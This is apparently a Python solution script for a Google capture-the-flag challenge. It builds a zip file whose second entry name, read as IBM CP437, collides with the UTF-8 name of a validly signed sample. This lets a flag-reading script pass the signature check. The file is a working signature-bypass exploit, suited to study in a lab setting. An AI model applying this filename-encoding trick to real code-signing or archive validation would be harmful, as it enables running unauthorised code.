#!/usr/bin/python3

# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http:#www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Author: Ian Eldred Pudney

import os
import subprocess

script_dir = os.path.dirname(os.path.realpath(__file__))
os.chdir(script_dir)

# The signature on the provided sample
sig = "YMH2otgxGvZoXI436R0OlH2Go5NJzawo8GFL0fl24lxRx1ShgasmHuufYEqFs4ob1aiWrqxZqgHCPX4Nyc6WAQ"

# The contents of the provided sample
with open(f"../sample/sample.{sig}.autorun.py", "rb") as f:
  sample_source = f.read()

# Our flag-reading contents
exploit_source = b'print(open("../flag", "r").read())'


# We need to make a zip file with two files:
#   sample:  A script containing the sample code, with the valid signature
#   exploit: A script that reads the flag, with the same signature
#            (not valid for this file)
# These files need to have very specific filenames. They must both start with a
# sequence of utf-8 characters, followed by .<sig>.autorun.py. However, the
# Unicode characters in the exploit filename must be such that, if they're
# decoded as IBM Code Page 437 and then encoded as utf-8, they equal the utf-8
# in the sample filename.

exploit_utf = "╧ä".encode("utf-8")
sample_utf = "τ".encode("utf-8")

# Validate that we picked good unicode characters
assert(sample_utf.decode("cp437").encode("utf-8") == exploit_utf)

# We need to pack these into a zip file. However, we need to ensure that the
# file names are marked as non-unicode in the zip file. Therefore, we prefix
# them with definitely-not-unicode bytes and strip them out afterward.

sample_filename = b"\xff" + sample_utf + b"." + sig.encode('utf-8') + b".autorun.py"
exploit_filename = b"\xff" + exploit_utf + b"." + sig.encode('utf-8') + b".autorun.py"

with open(sample_filename, "wb") as f:
  f.write(sample_source)
with open(exploit_filename, "wb") as f:
  f.write(exploit_source)

if os.path.exists("exploit.zip"):
  os.remove("exploit.zip")

subprocess.check_call([b"zip", b"exploit.zip", sample_filename, exploit_filename])

# Strip the non-unicode byte out of the filenames present in the zipfile
with open("exploit.zip", "rb") as f:
  zip_contents = f.read()

zip_contents = zip_contents.replace(sample_filename, b"x" + sample_filename[1:])
zip_contents = zip_contents.replace(exploit_filename, b"x" + exploit_filename[1:])

with open("exploit.zip", "wb") as f:
  f.write(zip_contents)

# Clean up the weirdly named files we wrote. The mere existence of these files
# will break this git repo on non-Linux systems.
os.remove(sample_filename)
os.remove(exploit_filename)
